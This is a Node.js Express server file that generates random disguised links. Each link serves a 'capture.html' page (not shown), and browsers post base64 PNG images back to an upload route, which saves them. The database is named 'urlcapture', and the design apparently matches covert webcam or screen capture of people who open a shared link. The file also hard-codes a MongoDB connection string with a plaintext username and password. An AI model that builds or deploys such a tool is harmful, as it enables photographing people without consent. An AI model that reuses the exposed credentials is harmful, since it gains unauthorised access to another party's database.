const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const fs = require('fs');

const app = express();

mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dartmino64:CXd21bYqriwfgtUN@cluster0.p7eujjb.mongodb.net/urlcapture?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

// Define URL schema and model
const urlSchema = new mongoose.Schema({
  originalUrl: String,
  newUrl: String
});
const Url = mongoose.model('Url', urlSchema);

// Middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.post('/generate', async (req, res) => {
  const { originalUrl } = req.body;
  const newUrl = `https://your-domain.com/${Math.random().toString(36).substring(7)}`;
  const url = new Url({ originalUrl, newUrl });
  await url.save();
  res.json({ newUrl });
});

app.get('/:id', async (req, res) => {
  const id = req.params.id;
  const url = await Url.findOne({ newUrl: `https://your-domain.com/${id}` });
  if (url) {
    res.sendFile(path.join(__dirname, 'public', 'capture.html'));
  } else {
    res.status(404).send('Not Found');
  }
});

app.post('/upload', (req, res) => {
  const imageData = req.body.image;
  const base64Data = imageData.replace(/^data:image\/png;base64,/, '');

  const filePath = path.join(__dirname, 'uploads', `image_${Date.now()}.png`);
  fs.writeFile(filePath, base64Data, 'base64', (err) => {
    if (err) {
      return res.status(500).send('Error saving image');
    }
    res.status(200).send('Image uploaded successfully');
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
